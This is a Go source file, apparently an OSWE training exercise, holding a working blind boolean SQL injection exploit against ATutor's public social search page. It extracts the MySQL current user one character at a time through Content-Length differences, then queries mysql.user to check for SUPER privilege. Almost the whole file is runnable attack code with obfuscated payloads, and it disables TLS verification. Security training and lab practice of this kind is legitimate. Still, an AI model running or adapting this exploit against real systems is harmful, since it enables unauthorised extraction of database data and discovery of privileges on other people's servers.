package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"github.com/iPhantasmic/OSWE/scripts/utils"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
)

// Ex 3.5.2.1 - MySQL Extract DB User Permissions

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func sendSearchFriendsSQLiDBA(ip string, sqliPayload string) int {
	for i := 32; i < 126; i++ {
		// do necessary URL manipulation
		updatedPayload := strings.Replace(sqliPayload, "[CHAR]", fmt.Sprintf("%d", i), -1)
		requestURL := fmt.Sprintf("http://%s/ATutor/mods/_standard/social/index_public.php?q=%s", ip, updatedPayload)

		// send the request
		contentLength := utils.SendGetRequest(client, false, requestURL).ContentLength

		if contentLength > 0 {
			return i
		}
	}

	return 0
}

func stage1(ip string) string {
	utils.PrintInfo("Starting Stage 1 - current_user()")
	currentUser := ""

	utils.PrintSuccess("Stage 1 - Current User: ")
	for i := 1; i < 20; i++ {
		sqliPayload := fmt.Sprintf("test')/**/or/**/(ascii(substring((select/**/current_user()),%d,1)))=[CHAR]%%23", i)
		extractedChar := fmt.Sprintf("%c", sendSearchFriendsSQLiDBA(ip, sqliPayload))
		currentUser += extractedChar
		fmt.Print(extractedChar)
	}

	return currentUser
}

func stage2(ip string, currentUser string) string {
	utils.PrintInfo("Starting Stage 2 - Check for SUPER")
	userHost := strings.Split(strings.Replace(currentUser, "\x00", "", -1), "@")

	sqliPayload := fmt.Sprintf("test')/**/or/**/(ascii(substring(("+
		"SELECT/**/count(*)/**/"+
		"FROM/**/mysql.user/**/"+
		"WHERE/**/Super_priv='Y'/**/"+
		"AND/**/user='%s'/**/AND/**/host='%s'),1,1)))=[CHAR]%%23", userHost[0], userHost[1])
	extractedChar := fmt.Sprintf("%c", sendSearchFriendsSQLiDBA(ip, sqliPayload))

	return extractedChar
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	//debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 2 {
		utils.PrintFailure(fmt.Sprintf("usage: %s [-proxy=<proxyIP>] <target>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.121.103", os.Args[0]))
		os.Exit(1)
	}

	ip := flag.Arg(0)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// create our HTTP client using the above transport and set the global variable
	client = &http.Client{Transport: tr}

	currentUser := stage1(ip)
	fmt.Print("\n")
	result := stage2(ip, currentUser)

	if result == "1" {
		utils.PrintSuccess("current_user() of " + currentUser + " is a DBA!")
	} else {
		utils.PrintFailure("current_user() of " + currentUser + " is not a DBA...")
	}

	fmt.Println("")
	utils.PrintSuccess("Done!")
}
